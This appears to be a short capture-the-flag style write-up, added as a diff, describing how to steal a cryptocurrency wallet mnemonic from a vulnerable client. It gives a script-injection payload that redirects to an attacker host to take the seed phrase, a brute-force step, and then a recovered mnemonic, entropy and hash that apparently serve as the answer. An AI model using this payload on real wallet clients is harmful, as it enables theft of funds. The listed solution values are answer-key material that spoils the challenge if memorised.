@@ -1,0 +1,11 @@
+The vulnerable client is subject to https://github.com/dleshem/electrumizer.
+
+1. prepare electrumizer on an attacker's server.
+2. send ```</textarea><script>window.location("http://attacker.example/electrumizer")``` to steal the mnemonic
+3. bruteforce it to recover the entropy.
+
+---
+
+mnemonic: flag wealth bread squirrel sort urban paddle panic company material butter tilt city hobby seven sample caution ivory cup because piece crime mixture artwork
+entropy: 583f046de9dcf9dea7b4fd2e911c7d710296d8b12df824aedcd689ea46672390
+md5: 2e36c3919822de3223e55efd8425f055
